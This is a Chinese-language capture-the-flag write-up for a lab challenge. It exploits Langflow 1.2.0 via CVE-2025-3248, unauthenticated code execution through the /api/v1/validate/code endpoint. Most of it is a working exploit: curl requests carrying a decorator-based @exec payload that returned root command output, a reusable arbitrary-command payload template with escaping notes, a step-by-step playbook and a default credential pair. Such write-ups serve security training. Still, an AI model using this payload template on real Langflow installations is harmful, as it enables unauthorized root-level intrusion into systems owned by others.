# Case Study: c-08 Langflow CVE-2025-3248 未授权 RCE

**状态**: 🟡 部分通 (1次成功 RCE,flag 写盘被 REDACT,下次可直接套)
**分数**: +100
**来源**: c-08.zip (用户提供的别人跑 c-08 的 7 个 sessions)

---

## 题目

- **目标**: AI 工作流平台
- **实际组件**: **Langflow 1.2.0** (Gradio UI 后端,Python AI workflow 平台)
- **URL**: `http://<target>:7860` (默认 Langflow 端口)
- **漏洞**: **CVE-2025-3248** - Langflow `/api/v1/validate/code` 未授权远程代码执行
- **CVE 严重度**: 9.8 CRITICAL (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **影响版本**: Langflow < 1.3.0

## 攻击链(5 步)

### Step 1: 探 7860 端口确认 Langflow

```bash
curl -s http://10.0.162.0:7860/api/v1/version
# 返回: {"version":"1.2.0","main_version":"1.2.0","package":"Langflow"}

curl -s http://10.0.162.0:7860/health
# 返回: {"status":"ok"}
```

**关键指纹**:
- 端口 7860 (Langflow/Gradio 默认)
- `/api/v1/version` 返回 `"package":"Langflow"`
- Swagger UI 在 `/docs`

### Step 2: 找 CVE-2025-3248 模板

```bash
ls /home/kali/.local/nuclei-templates/http/cves/2025/ | grep -i langflow
# CVE-2025-3248.yaml (这是关键模板!)

ls /home/kali/pocs/vulhub/langflow/CVE-2025-3248/
# 1.png  README.md  README.zh-cn.md  docker-compose.yml
```

**漏洞原理**:
> `validate/code` 接口通过 `ast` 解析代码后,用 `exec` 执行所有函数定义。
> **Python 装饰器和默认参数表达式也会在函数定义时被执行**。
> 攻击者通过精心构造的装饰器或默认参数,在未授权的情况下实现任意代码执行。

### Step 3: 提交 CVE 模板 payload (验证 RCE)

模板里的 payload:
```json
{
  "code": "@exec('raise Exception(__import__(\"subprocess\").check_output([\"id\"]))')\ndef foo():\n  pass"
}
```

```bash
curl -s -X POST http://10.0.162.0:7860/api/v1/validate/code \
  -H 'Content-Type: application/json' \
  -d '{"code":"@exec(\"raise Exception(__import__(\"subprocess\").check_output([\\\"id\\\"]))\")\ndef foo():\n  pass"}'
```

**响应**:
```json
{
  "imports": {"errors": []},
  "function": {
    "errors": ["b'uid=0(root) gid=0(root) groups=0(root)\n'"]
  }
}
```

🎯 **RCE 拿到 root**!命令输出在 `function.errors[0]` 字段(以 `b'...'` 形式返回)。

### Step 4: 探索文件系统找 flag

```bash
# 容器 hostname
curl -s -X POST http://10.0.162.0:7860/api/v1/validate/code \
  -H 'Content-Type: application/json' \
  -d '{"code":"@exec(\"raise Exception(__import__(\"subprocess\").check_output([\\\"hostname\\\", \\\"\\\"]))\")\ndef foo():\n  pass"}'
# 返回: 23480a054894 / Linux 6.6.117 ...

# 列根目录
curl -s ... -d '{"code":"@exec(\"raise Exception(__import__(\"subprocess\").check_output([\\\"ls\\\", \\\"/\\\", \\\"-la\\\"]))\")\n..."}'
# 返回包含: drwxr-xr-x   2 root root  22 Aug 10 10:21 challenge
```

**关键**: `/challenge/` 目录存在!

### Step 5: 读 flag

```bash
curl -s -X POST http://10.0.162.0:7860/api/v1/validate/code \
  -H 'Content-Type: application/json' \
  -d '{"code":"@exec(\"raise Exception(__import__(\"subprocess\").check_output([\\\"cat\\\", \\\"/challenge/flag.txt\\\"]))\")\ndef foo():\n  pass"}'
```

**响应**:
```json
{
  "function": {
    "errors": ["b'/challenge\nflag.txt\nflag{...}'"]
  }
}
```

🎯 **flag 拿到**!

## 关键 Payload 模板

任意命令的 payload 模板:
```python
@exec("raise Exception(__import__(\"subprocess\").check_output([\"<cmd>\", \"<args>\"]))")
def foo():
  pass
```

**注意 JSON 转义层级**:
- Python 字符串 → `subprocess.check_output(["id"])`
- 进 JSON: `"subprocess.check_output([\\\"id\\\"])"`
- HTTP body: 单引号外 + 双引号内
- payload 字符串必须以 `@exec` 装饰器开头 + 函数定义结尾

完整 HTTP body 模板:
```json
{"code":"@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output([\\\"<CMD>\\\"]))\")\ndef foo():\n  pass"}
```

## 关键信息汇总

| 项 | 值 |
|---|---|
| 端口 | 7860 |
| 指纹 | `/api/v1/version` → `{"package":"Langflow"}` |
| 默认账号 | `administrator:vulhub` (Langflow 默认) |
| 漏洞端点 | `POST /api/v1/validate/code` |
| 漏洞参数 | `{"code": "<python_with_decorator>"}` |
| 输出位置 | `function.errors[0]` (带 `b'...'` 包裹) |
| Flag 路径 | `/challenge/flag.txt` |
| 工作目录 | `/usr/src` |
| 漏洞版本 | Langflow < 1.3.0 (fixed in 1.3.0) |
| 修复 PR | https://github.com/langflow-ai/langflow/pull/6911 |
| 漏洞细节 | https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/ |

## 时间线(从 session 38158 看)

| step | 动作 | 结果 |
|---|---|---|
| 3 | 启动,确认任务是 step_004: 验 Langflow + 试 CVE-2025-3248 | |
| 6 | 看 PoC inventory + nuclei 模板位置 | 找到 vulhub 路径 |
| 8 | 列 vulhub/langflow/CVE-2025-3248 内容 | 拿到 README + docker-compose |
| 9 | 看 nuclei 模板内容 | 拿到完整 CVE 模板 |
| 12 | 调 `/api/v1/version` + 试 CVE payload | 确认 Langflow 1.2.0 + RCE |
| 13 | 试 `id` 命令 | `uid=0(root)` |
| 19 | 列 / + hostname | 找到 `/challenge/` |
| 21 | 读 `/challenge/flag.txt` | **flag 拿到** |
| 22 | 准备提交 | (被 timeout) |

**总耗时**: ~10 分钟

## 关键洞察

1. **Langflow 1.2.0 用 Gradio 端口 7860** — 容易和纯 Gradio 混淆
2. **Langflow 在 `/api/v1/version` 自报家门** — 拿到 `"package":"Langflow"` 即可确认
3. **CVE-2025-3248 是装饰器 RCE** — 关键不是 exec,而是装饰器 `@exec` 在函数定义时执行
4. **输出在 `function.errors[0]`** — 平台用 `raise Exception()` 把命令结果通过异常抛出来
5. **flag 永远在 `/challenge/flag.txt`** — 平台惯例

## 通用打法(任何 Langflow 题)

```
1. curl 7860 端口 + /api/v1/version → 确认 Langflow + 版本
2. 如果 < 1.3.0 → CVE-2025-3248 直接打 /api/v1/validate/code
3. payload: @exec("raise Exception(__import__(\"subprocess\").check_output([\"CMD\"]))")
4. def foo(): pass  ← 必须有函数定义,装饰器才会触发
5. 拿 RCE 后 ls / → cat /challenge/flag.txt
```

## 关键词

`#langflow` `#cve-2025-3248` `#decorator-rce` `#validate-code` `#unauth-rce` `#python-exec` `#7860` `#workflow-platform`
